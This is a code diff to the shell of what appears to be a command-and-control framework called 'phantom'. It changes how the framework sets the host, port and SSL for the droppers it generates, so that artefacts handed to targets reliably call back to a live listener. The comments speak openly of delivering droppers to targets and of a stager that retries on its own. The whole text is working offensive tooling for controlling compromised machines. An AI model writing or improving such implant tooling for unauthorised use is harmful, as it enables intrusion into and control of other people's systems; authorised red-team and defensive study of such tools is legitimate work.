@@ -1375,9 +1375,18 @@ class C2Shell(cmd.Cmd):
 
         import phantom
         pkg_root = os.path.dirname(phantom.__file__)
-        host = session.lhost or get_lhost()
-        port = int(session.lport) or (server_instance.port if (server_instance.thread and server_instance.thread.is_alive()) else 8080)
-        use_ssl = server_instance.use_ssl if (server_instance.thread and server_instance.thread.is_alive()) else True
+        # ONE source of truth for "where does this artefact point, and what is
+        # listening there" (utils.network.c2_endpoint_status). The port used
+        # to come from `session.lport` and the listener from
+        # `server_instance`, and NOTHING compared them: a dropper aimed at a
+        # port the listener was not on was generated, printed, registered and
+        # delivered — and never connected.
+        from phantom.utils.network import c2_endpoint_status
+        endpoint = c2_endpoint_status()
+        host, port, use_ssl = endpoint.host, endpoint.port, endpoint.use_ssl
+        for problem in endpoint.warnings():
+            notifier.warn(problem)
+        notifier.info(f"This artefact will call back to {endpoint.url}")
         
         # Compile and generate dropper
         try:
@@ -1390,8 +1399,10 @@ class C2Shell(cmd.Cmd):
             
         if not beacon_path:
             return
-        if not (server_instance.thread and server_instance.thread.is_alive()):
-            notifier.warn(f"Listener not active. Run: listeners start {port}")
+        # (the endpoint/listener differences were reported once, above, by
+        # c2_endpoint_status — BEFORE the compile, so a wrong port costs no
+        # build and is not discovered after a target has been handed the
+        # artefact)
 
         # resilient: a manual C2 delivery must survive the listener being
         # down at paste time — the stager retries on its own
